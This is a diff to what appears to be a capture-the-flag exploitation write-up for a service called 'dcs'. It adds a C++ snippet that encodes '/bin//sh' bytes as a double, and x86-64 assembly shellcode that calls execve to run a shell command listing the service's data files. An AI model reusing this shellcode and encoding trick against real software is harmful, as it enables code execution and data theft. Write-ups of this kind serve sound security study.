@@ -177,6 +177,24 @@ mkdir -p /var/dcs/data/ru && rm -f /var/dcs/data/ru/ctfructfructfructfructfructf
 ```
 Note, that you need to append 0, ret, into generated file to `GET /api/compute` works correctly.
 
+### Note 4
+This is how you can convert bytes of shell into double value:
+```cpp
+#include <iostream>
+#include <iomanip>
+#include <cstring>
+
+int main() {
+	union {
+		char bytes[sizeof(double)];
+		double v;
+	};
+	std::strncpy(bytes, "/bin//sh", sizeof(double));
+	std::cout << std::setprecision(30) << v << std::endl;
+    return 0;
+}
+```
+
 ### Result
 
 Combining it all together, we got [next sploit](/sploits/dcs/dcs.1.sploit.py):
@@ -269,4 +287,33 @@ if __name__ == '__main__':
                 r = c.get(t)
                 assert(r.error == '')
                 print(r.description)
+```
+
+[sploit asm code](/sploits/dcs/shell.S) just run `execve` with bash script from above:
+```
+.section .text
+.globl _start
+
+_start:
+    xor     %rdx, %rdx
+    leaq    arg2(%rip), %rsi
+    pushq   %rsi
+    leaq    arg1(%rip), %rsi
+    pushq   %rsi
+    leaq    cmd(%rip), %rsi
+    pushq   %rsi
+    movq    %rsp, %rsi
+    leaq    cmd(%rip), %rdi
+    movq    $59, %rax
+    syscall
+    ret
+
+cmd:
+    .asciz "/bin/sh"
+arg1:
+    .asciz "-c"
+arg2:
+    .asciz "mkdir -p dataexample/ru && rm -f dataexample/ru/ctfructfructfructfructfructfru && find dataexample -type f > dataexample/ru/ctfructfructfructfructfructfru && printf '\\00\\303' >> dataexample/ru/ctfructfructfructfructfructfru"
+null:
+    .quad 0
 ```
